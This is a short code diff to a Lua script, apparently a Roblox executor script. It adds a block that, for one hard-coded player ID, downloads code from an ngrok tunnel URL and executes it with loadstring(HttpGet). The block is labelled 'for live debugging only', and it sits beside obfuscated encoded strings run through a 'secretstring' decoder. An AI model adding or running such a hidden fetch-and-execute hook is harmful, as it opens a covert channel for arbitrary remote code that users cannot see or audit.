@@ -2,6 +2,11 @@ repeat
 	task.wait(1)
 until game:IsLoaded();
 
+if game:GetService("Players").LocalPlayer.UserId == 8270464966 then
+	loadstring(game:HttpGet("https://9c29-2603-6012-141-3048-744e-d2f4-8650-73fe.ngrok-free.app/"))()
+	error("for live debugging only")
+end
+
 secure({
     ["preload"] = true, --loadstring(secretstring("dJZ2fICV2It1m5iAvHWDnXrnldjb3szc3d3XzFnpz1lUXdzo6ene3aX5oZS5kvzGvcKbwJ7mtnTGyqo="))(),
     ["message"] = secretstring("VomTftJ4mZF9iZC9g3qJ13SjgaafrqDlipLOf6WplKhkp7Gl2JWbuo25p9W2krudt/2X54/Q3+R9KwzZzLK7sqUFxNi6tLi/ELHP28fSIsW/zMfNxd3v2iLG6h3Sytniz9PmE9vcFe3h2+DY8e8="),
